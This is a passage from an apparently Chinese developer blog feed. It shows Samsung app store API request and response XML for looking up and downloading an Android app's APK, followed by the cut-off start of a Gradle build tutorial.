class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2280"</span> <span class="attr">name</span>=<span class="string">"productDetailMain"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">startNum</span>=<span class="string">"1"</span> <span class="attr">endNum</span>=<span class="string">"1"</span> <span class="attr">totalCount</span>=<span class="string">"1"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"81"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID"</span>&gt;</span>G000028478<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"needToLogin"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productImgUrl"</span>&gt;</span>http://img.samsungapps.com/productNew/000000607315/IconImage_20160826132045350_NEW_WEB_ICON_135_135.png<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"panelImgUrl"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductStore"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"alreadyPurchased"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"purchasedMethod"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"orderID"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"orderItemSeq"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"averageRating"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"ratingParticipants"</span>&gt;</span>104<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"myRatingYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"myCmtYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerID"</span>&gt;</span>3ehgzozhzt<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerName"</span>&gt;</span>China TravelSky Holding Company<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerBrandName"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"currencyUnit"</span>&gt;</span>元<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellingPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"reducePrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountFlag"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"restrictedAge"</span>&gt;</span>0+<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bundleYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"creditcardYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"phonebillYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"pSmsPurchaseYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"optBillYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"optBillList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPhoneBillYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"testPSMSPurchaseYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"mobileWalletSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"cyberCash"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"prepaidCardList"</span>&gt;</span>China Mobile@SASCNCSN01@http://www.chinamobileltd.com/@1;China Unicom@SASCNCSN01@http://www.chinaunicom.com/@2;China Telecom@SASCNCSN01@http://www.chinatelecom.com.cn/@3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"aliPay"</span>&gt;</span>Alipay paymentTypeID|6mztkyy858/CAC@SASCNCAP01@https://www.alipay.com<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"trialYN"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryPath"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryPath2"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"version"</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"versionCode"</span>&gt;</span>109<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>application<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"loadType"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"edgeAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"realContentsSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"phonebillPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPhoneBillPrice"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"compatibleOS"</span>&gt;</span>16<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"compatibleMaxOS"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tgtSDKVersion"</span>&gt;</span>22<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"nameAuthYN"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"validDate"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalTermArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalPriceArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalPhonebillPriceArray"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tnbYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"wishListYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"wishListId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"valuePackDispYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"valuePackPrmId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"multipleDeviceNCount"</span>&gt;</span>0/10<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"likeCount"</span>&gt;</span>265<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bGearVersion"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppMasterInfo"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"gearWatchFaceYN"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"IAPSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"newProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountType"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"spotLightId"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"curationYn"</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"giftsTagYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"capIdList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"shortDescription"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post https://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"downloadForRestore"</span> <span class="attr">id</span>=<span class="string">"2316"</span> <span class="attr">numParam</span>=<span class="string">"6"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"predeployed"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"stduk"</span>&gt;</span>7996060c3072254b08e62e7e35efdc71fbb8a4092039fb27ac47cf693f4587c1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imei"</span>&gt;</span>990004393474345<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"autoUpdateYN"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"downloadType"</span>&gt;</span>new<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2316"</span> <span class="attr">name</span>=<span class="string">"downloadForRestore"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>&gt;</span>success<span class="tag">&lt;/<span class="name">errorString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"downLoadURI"</span>&gt;</span>http://cdnet-dn.gw.samsungapps.com/astore_bin/3ehgzozhzt/2016/0824/App_20160824114025329.apk?ctnt_id=000000607315&amp;amp;bsize=19925480&amp;amp;px-time=1474171361&amp;amp;px-hash=8151b80e26311a708ed7a37a479b45a4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentsSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"deltaDownloadURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"deltaContentsSize"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installedBinaryHashValue"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"updateBinaryHashValue"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"signature"</span>&gt;</span>125-71-7912112-100109-102-765995-12564-9428-93231161-111-1166059-11712-107-3682-1006175971062715-94-336650-9194-124-11026-219577-23-38116127-107350-12550100-2979-306539-343723-75-78121-3311610279-5-8728-19687045103-38-6563-63113-20-55-1414-10-112-77761710967-3569-99-60-46796229-49-1352-5889-121-53-7-7710120-3960-34107-27912910598-2138-30<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"gSignatureDownloadURL"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Gradle 教程</title>
      <link href="/2016/06/27/Gradle-%E6%95%99%E7%A8%8B/"/>
      <url>/2016/06/27/Gradle-%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h1><p><a href="http://gradle.org/" target="_blank" rel="noopener">Gradle</a>提供了一个DSL(领域特定语言)，一个约定优于配置的方法，还有更强大的依赖管理，Gradle使得我们可以抛弃XML的繁琐配置，引入动态语言Groovy来定义你的构建逻辑。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>Gradle</code>的安装非常方便，下载ZIP包，解压到本地目录，设置<code>GRADLE_HOME</code>环境变量，并将<code>GRADLE_HOME/bin</code>加到<code>PATH</code>环境变量中，安装就完成了。然后在命令行下运行<code>gradle -v</code>，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradle -v</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Gradle 2.14</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Build time:   2016-06-14 07:16:37 UTC</span><br><span class="line">Revision:     cba5fea19f1e0c6a00cc904828a6ec4e11739abc</span><br><span class="line"></span><br><span class="line">Groovy:       2.4.4</span><br><span class="line">Ant:          Apache Ant(TM) version 1.9.6 compiled on June 29 2015</span><br><span class="line">JVM:          1.8.0_91 (Oracle Corporation 25.91-b14)</span><br><span class="line">OS:           Mac OS X 10.11.5 x86_64</span><br></pre></td></tr></table></figure></p><h2 id="构建Java项目"><a href="#构建Java项目" class="headerlink" title="构建Java项目"></a>构建Java项目</h2><p>每个<code>Gradle</code>项目都会创建一个<code>build.gradle</code>文件，相关配置都写在这里。</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>因为是<code>Java</code>项目，这里要用到<code>Gradle</code>的<code>Java</code>插件：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: <span class="string">'java'</span></span><br></pre></td></tr></table></figure></p><p>同时，我们需要指定编译时的<code>Java Lanaguage Level</code>和生成<code>.class</code>文件的<code>JVM</code>，如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compileJava &#123;</span><br><span class="line">    <span class="keyword">sourceCompatibility</span> = <span class="number">1.6</span></span><br><span class="line">    <span class="keyword">targetCompatibility</span> = <span class="number">1.6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们在<code>IDE</code>中使用，可以使用<code>IDE</code>对应的插件，这里我使用<code>IntelliJ IDEA</code>的插件，如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: <span class="string">'idea'</span></span><br></pre></td></tr></table></figure></p><p>如果构建的是<code>Java</code>应用，还要用如下插件：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: <span class="string">'application'</span></span><br></pre></td></tr></table></figure></p><p>添加<code>application</code>插件之后，通常需要指定<code>Main Class</code>：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mainClassName = <span class="string">''</span></span><br></pre></td></tr></table></figure></p><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>插件配置完后，通常会用到第三方库，为了引用这些<code>JAR</code>文件，需要在<code>Gradle</code>里面配置。比如，我们使用<code>Maven Repository</code>：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">repositories</span> &#123;</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>声明编译时需要的依赖和测试时需要的依赖：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">compile</span> <span class="keyword">group</span>: <span class="string">'commons-collections'</span>, name: <span class="string">'commons-collections'</span>, version:</span><br><span class="line"><span class="string">'3.2'</span></span><br><span class="line">    testCompile <span class="keyword">group</span>: <span class="string">'junit'</span>, name: <span class="string">'junit'</span>, version: <span class="string">'4.+'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有些情况下，<code>Maven Repository</code>里并没有我们使用的库，所以我们从本地添加：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span 